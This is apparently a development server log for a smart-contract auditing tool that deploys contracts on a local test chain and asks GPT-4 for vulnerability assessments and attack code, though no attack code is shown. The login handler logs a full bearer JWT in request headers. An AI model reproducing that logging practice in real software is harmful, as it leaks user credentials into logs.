2025-06-23 13:57:10,952 - werkzeug - INFO - 172.27.0.1 - - [23/Jun/2025 13:57:10] "OPTIONS /etherscan/0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97 HTTP/1.1" 200 -
2025-06-23 13:57:10,968 - app.api.contract - INFO - Received Etherscan contract fetch request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45 for address: 0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97
2025-06-23 13:57:10,982 - app.services.contract_service - INFO - Fetching contract data from Etherscan for address: 0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97
2025-06-23 13:57:10,984 - app.services.contract_service - ERROR - Etherscan API key not found in configuration
2025-06-23 13:57:10,985 - app.api.contract - WARNING - Failed to fetch contract from Etherscan: Etherscan API key not configured
2025-06-23 13:57:10,987 - flask_cors.extension - DEBUG - Request to ''/etherscan/0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 13:57:10,989 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 13:57:10,990 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 13:57:10,991 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 13:57:10,992 - werkzeug - INFO - 172.27.0.1 - - [23/Jun/2025 13:57:10] "[31m[1mGET /etherscan/0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97 HTTP/1.1[0m" 400 -
2025-06-23 13:57:13,424 - app.api.contract - INFO - Received Etherscan contract fetch request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45 for address: 0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97
2025-06-23 13:57:13,443 - app.services.contract_service - INFO - Fetching contract data from Etherscan for address: 0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97
2025-06-23 13:57:13,447 - app.services.contract_service - ERROR - Etherscan API key not found in configuration
2025-06-23 13:57:13,449 - app.api.contract - WARNING - Failed to fetch contract from Etherscan: Etherscan API key not configured
2025-06-23 13:57:13,454 - flask_cors.extension - DEBUG - Request to ''/etherscan/0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 13:57:13,457 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 13:57:13,459 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 13:57:13,462 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 13:57:13,465 - werkzeug - INFO - 172.27.0.1 - - [23/Jun/2025 13:57:13] "[31m[1mGET /etherscan/0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97 HTTP/1.1[0m" 400 -
2025-06-23 13:57:13,860 - app.api.contract - INFO - Received Etherscan contract fetch request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45 for address: 0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97
2025-06-23 13:57:13,881 - app.services.contract_service - INFO - Fetching contract data from Etherscan for address: 0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97
2025-06-23 13:57:13,884 - app.services.contract_service - ERROR - Etherscan API key not found in configuration
2025-06-23 13:57:13,886 - app.api.contract - WARNING - Failed to fetch contract from Etherscan: Etherscan API key not configured
2025-06-23 13:57:13,890 - flask_cors.extension - DEBUG - Request to ''/etherscan/0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 13:57:13,894 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 13:57:13,896 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 13:57:13,899 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 13:57:13,902 - werkzeug - INFO - 172.27.0.1 - - [23/Jun/2025 13:57:13] "[31m[1mGET /etherscan/0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97 HTTP/1.1[0m" 400 -
2025-06-23 13:57:14,099 - app.api.contract - INFO - Received Etherscan contract fetch request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45 for address: 0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97
2025-06-23 13:57:14,108 - app.services.contract_service - INFO - Fetching contract data from Etherscan for address: 0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97
2025-06-23 13:57:14,111 - app.services.contract_service - ERROR - Etherscan API key not found in configuration
2025-06-23 13:57:14,114 - app.api.contract - WARNING - Failed to fetch contract from Etherscan: Etherscan API key not configured
2025-06-23 13:57:14,117 - flask_cors.extension - DEBUG - Request to ''/etherscan/0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 13:57:14,120 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 13:57:14,123 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 13:57:14,125 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 13:57:14,129 - werkzeug - INFO - 172.27.0.1 - - [23/Jun/2025 13:57:14] "[31m[1mGET /etherscan/0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97 HTTP/1.1[0m" 400 -
2025-06-23 14:08:33,492 - flask_cors.extension - DEBUG - Request to ''/etherscan/visitsGroupedByUrl   .windowedBy(TimeWindows.of(Duration.ofMinutes(1)))   .count()(Materialized.as(visitsPerUrlPerMinuteStoreName))'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 14:08:33,499 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 14:08:33,500 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 14:08:33,502 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 14:08:33,505 - werkzeug - INFO - 172.27.0.1 - - [23/Jun/2025 14:08:33] "OPTIONS /etherscan/visitsGroupedByUrl%20%20%20.windowedBy(TimeWindows.of(Duration.ofMinutes(1)))%20%20%20.count()(Materialized.as(visitsPerUrlPerMinuteStoreName)) HTTP/1.1" 200 -
2025-06-23 14:08:33,518 - app.api.contract - INFO - Received Etherscan contract fetch request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45 for address: visitsGroupedByUrl   .windowedBy(TimeWindows.of(Duration.ofMinutes(1)))   .count()(Materialized.as(visitsPerUrlPerMinuteStoreName))
2025-06-23 14:08:33,543 - app.services.contract_service - INFO - Fetching contract data from Etherscan for address: visitsGroupedByUrl   .windowedBy(TimeWindows.of(Duration.ofMinutes(1)))   .count()(Materialized.as(visitsPerUrlPerMinuteStoreName))
2025-06-23 14:08:33,545 - app.services.contract_service - ERROR - Etherscan API key not found in configuration
2025-06-23 14:08:33,546 - app.api.contract - WARNING - Failed to fetch contract from Etherscan: Etherscan API key not configured
2025-06-23 14:08:33,548 - flask_cors.extension - DEBUG - Request to ''/etherscan/visitsGroupedByUrl   .windowedBy(TimeWindows.of(Duration.ofMinutes(1)))   .count()(Materialized.as(visitsPerUrlPerMinuteStoreName))'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 14:08:33,550 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 14:08:33,551 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 14:08:33,553 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 14:08:33,555 - werkzeug - INFO - 172.27.0.1 - - [23/Jun/2025 14:08:33] "[31m[1mGET /etherscan/visitsGroupedByUrl%20%20%20.windowedBy(TimeWindows.of(Duration.ofMinutes(1)))%20%20%20.count()(Materialized.as(visitsPerUrlPerMinuteStoreName)) HTTP/1.1[0m" 400 -
2025-06-23 14:27:25,701 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-06-23 14:27:25,864 - app.app - INFO - Application started
2025-06-23 14:27:25,875 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.28.0.5:8000
2025-06-23 14:27:25,877 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-23 14:27:44,072 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 14:27:44,078 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 14:27:44,092 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 14:27:44,097 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 14:27:44,104 - werkzeug - INFO - 172.28.0.1 - - [23/Jun/2025 14:27:44] "OPTIONS /login HTTP/1.1" 200 -
2025-06-23 14:27:44,118 - app.api.auth - INFO - Received login request with method: POST
2025-06-23 14:27:44,120 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTA2OTA1ODZ9.C7LswWsBgAJqiPnoNc4XTvLyXUmTkHn1z8PZCHMIR3I', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-06-23 14:27:44,122 - app.api.auth - INFO - Request content type: application/json
2025-06-23 14:27:44,124 - app.api.auth - INFO - Processing JSON request
2025-06-23 14:27:44,126 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 14:27:44,598 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 14:27:44,601 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 14:27:44,603 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 14:27:44,604 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 14:27:44,606 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 14:27:44,608 - werkzeug - INFO - 172.28.0.1 - - [23/Jun/2025 14:27:44] "POST /login HTTP/1.1" 200 -
2025-06-23 14:30:38,654 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 14:30:38,663 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 14:30:38,669 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 14:30:38,677 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 14:30:38,689 - werkzeug - INFO - 172.28.0.1 - - [23/Jun/2025 14:30:38] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-23 14:30:38,722 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 14:30:38,745 - app.api.contract - INFO - Analyzing code snippet
2025-06-23 14:30:38,793 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-23 14:30:38,802 - app.services.contract_service - INFO - Created temporary file for contract code: /tmp/tmprvx4kktw.sol
2025-06-23 14:30:38,814 - app.services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-06-23 14:30:38,816 - app.services.contract_service - INFO - Compiling contract...
2025-06-23 14:30:39,003 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.4.17+commit.bdeb9e52
2025-06-23 14:30:41,241 - solcx - INFO - Using solc version 0.4.17
2025-06-23 14:30:41,243 - solcx - INFO - solc 0.4.17 successfully installed at: /root/.solcx/solc-v0.4.17
2025-06-23 14:30:41,247 - solcx - INFO - Using solc version 0.4.17
2025-06-23 14:30:46,702 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 14:30:47,846 - app.services.contract_service - INFO - Compilation result: 4 contracts compiled
2025-06-23 14:30:47,849 - app.services.contract_service - INFO - Deploying 4 contracts...
2025-06-23 14:30:48,248 - app.services.contract_service - INFO - Contract Ownable deployed at 0xC89Ce4735882C9F0f0FE26686c53074E09B0D550
2025-06-23 14:30:48,249 - app.services.contract_service - INFO - Setting up contract Ownable...
2025-06-23 14:30:48,372 - app.services.contract_service - INFO - Contract Ownable setup completed
2025-06-23 14:30:48,373 - app.services.contract_service - INFO - Funding contract Ownable for attack testing...
2025-06-23 14:30:48,534 - app.services.contract_service - INFO - Contract Ownable funded
2025-06-23 14:30:48,979 - app.services.contract_service - INFO - Contract Pausable deployed at 0xD833215cBcc3f914bD1C9ece3EE7BF8B14f841bb
2025-06-23 14:30:48,981 - app.services.contract_service - INFO - Setting up contract Pausable...
2025-06-23 14:30:49,171 - app.services.contract_service - INFO - Contract Pausable setup completed
2025-06-23 14:30:49,173 - app.services.contract_service - INFO - Funding contract Pausable for attack testing...
2025-06-23 14:30:49,339 - app.services.contract_service - INFO - Contract Pausable funded
2025-06-23 14:30:49,683 - app.services.contract_service - INFO - Contract SafeMath deployed at 0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7
2025-06-23 14:30:49,684 - app.services.contract_service - INFO - Setting up contract SafeMath...
2025-06-23 14:30:49,714 - app.services.contract_service - INFO - Contract SafeMath setup completed
2025-06-23 14:30:49,716 - app.services.contract_service - INFO - Funding contract SafeMath for attack testing...
2025-06-23 14:30:49,871 - app.services.contract_service - INFO - Contract SafeMath funded
2025-06-23 14:30:50,643 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 14:30:51,399 - app.services.contract_service - INFO - Contract TetherToken deployed at 0xe982E462b094850F12AF94d21D470e21bE9D0E9C
2025-06-23 14:30:51,401 - app.services.contract_service - INFO - Setting up contract TetherToken...
2025-06-23 14:30:54,964 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 14:30:56,426 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 14:30:57,305 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 14:30:57,482 - app.services.contract_service - INFO - Contract TetherToken setup completed
2025-06-23 14:30:57,485 - app.services.contract_service - INFO - Funding contract TetherToken for attack testing...
2025-06-23 14:30:57,655 - app.services.contract_service - INFO - Contract TetherToken funded
2025-06-23 14:30:57,657 - app.services.contract_service - INFO - Building contract observation...
2025-06-23 14:31:00,582 - app.services.contract_service - INFO - Contract observation built successfully
2025-06-23 14:31:00,584 - app.services.contract_service - INFO - Generating attack strategy...
2025-06-23 14:31:00,585 - app.services.contract_service - INFO - Running Slither analysis...
2025-06-23 14:31:00,609 - app.services.contract_service - WARNING - Failed to run Slither analysis: solc-select non trouv√© : installe-le via pip install solc-select
2025-06-23 14:31:00,634 - app.services.contract_service - WARNING - Traceback (most recent call last):
  File "/app/modules/slither_scan.py", line 38, in ensure_solc_version
    subprocess.run(
  File "/usr/local/lib/python3.12/subprocess.py", line 548, in run
    with Popen(*popenargs, **kwargs) as process:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/subprocess.py", line 1026, in __init__
    self._execute_child(args, executable, preexec_fn, close_fds,
  File "/usr/local/lib/python3.12/subprocess.py", line 1955, in _execute_child
    raise child_exception_type(errno_num, err_msg, err_filename)
FileNotFoundError: [Errno 2] No such file or directory: 'solc-select'

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/app/services/contract_service.py", line 192, in analyze_contract_from_code
    slith_result = slither_analyze(temp_path)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 152, in slither_analyze
    slither_result = run_slither(sol_path, json_path, solc_version)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 69, in run_slither
    ensure_solc_version(solc_version)
  File "/app/modules/slither_scan.py", line 44, in ensure_solc_version
    raise EnvironmentError("solc-select non trouv√© : installe-le via pip install solc-select")
OSError: solc-select non trouv√© : installe-le via pip install solc-select

2025-06-23 14:31:00,636 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-06-23 14:31:00,637 - app.modules.attack_generator - INFO - Contract name: Ownable
2025-06-23 14:31:00,638 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-06-23 14:31:00,639 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-06-23 14:31:00,653 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-23 14:31:00,654 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-23 14:31:00,655 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-23 14:31:28,177 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 14:31:28,218 - app.modules.attack_generator - INFO - Received response from OpenAI API in 27.56 seconds
2025-06-23 14:31:28,228 - app.modules.attack_generator - INFO - Contract analysis completed in 27.56 seconds
2025-06-23 14:31:28,229 - app.modules.attack_generator - INFO - Vulnerability assessment: **A. Centralization / Owner Privileges**  
- The owner has extensive control: can pause/unpause the ...
2025-06-23 14:31:28,231 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-06-23 14:31:28,232 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-23 14:31:28,233 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-23 14:31:28,235 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-23 14:31:37,022 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 14:31:37,052 - app.modules.attack_generator - INFO - Received response from OpenAI API in 8.82 seconds
